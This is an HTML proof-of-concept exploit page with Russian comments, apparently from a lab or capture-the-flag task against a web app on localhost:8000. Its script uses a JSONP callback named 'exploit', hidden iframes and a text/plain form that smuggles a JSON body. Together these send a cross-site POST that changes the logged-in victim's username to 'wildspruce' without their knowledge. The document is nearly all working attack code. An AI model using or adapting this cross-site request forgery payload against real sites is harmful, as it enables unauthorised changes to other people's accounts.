<!DOCTYPE html>
<html>
<head>
  <title>Redirect</title>
</head>
<body>
  <script>
    function exploit(data) {
      // Ждем 3 секунды перед началом
      document.body.innerHTML = '<h1>Starting in 3 seconds...</h1>';

      setTimeout(() => {
        // Шаг 1: GET запрос на http://localhost:8000/#/sheets через iframe
        const iframe1 = document.createElement('iframe');
        iframe1.style.display = 'none';
        iframe1.src = 'http://localhost:8000/#/sheets';
        document.body.appendChild(iframe1);

        setTimeout(() => {
          // Шаг 2: POST запрос через форму в iframe
          const iframe2 = document.createElement('iframe');
          iframe2.name = 'postFrame';
          iframe2.style.display = 'none';
          document.body.appendChild(iframe2);

          const form = document.createElement('form');
          form.method = 'POST';
          form.action = 'http://localhost:8000/api/whoami';
          form.target = 'postFrame';
          form.enctype = 'text/plain';

          const input = document.createElement('input');
          input.type = 'hidden';
          input.name = '{"new_username":"wild';
          input.value = 'spruce"}';
          form.appendChild(input);

          document.body.appendChild(form);
          form.submit();

          setTimeout(() => {
            // Шаг 3: GET запрос на http://localhost:8000/#/settings через iframe
            const iframe3 = document.createElement('iframe');
            iframe3.style.display = 'none';
            iframe3.src = 'http://localhost:8000/#/settings';
            document.body.appendChild(iframe3);
          }, 1000);
        }, 1000);
      }, 3000);
    }
  </script>

  <!-- JSONP запрос -->
  <script src="http://localhost:8000/api/whoami/jsonp?callback=exploit"></script>
</body>
</html>
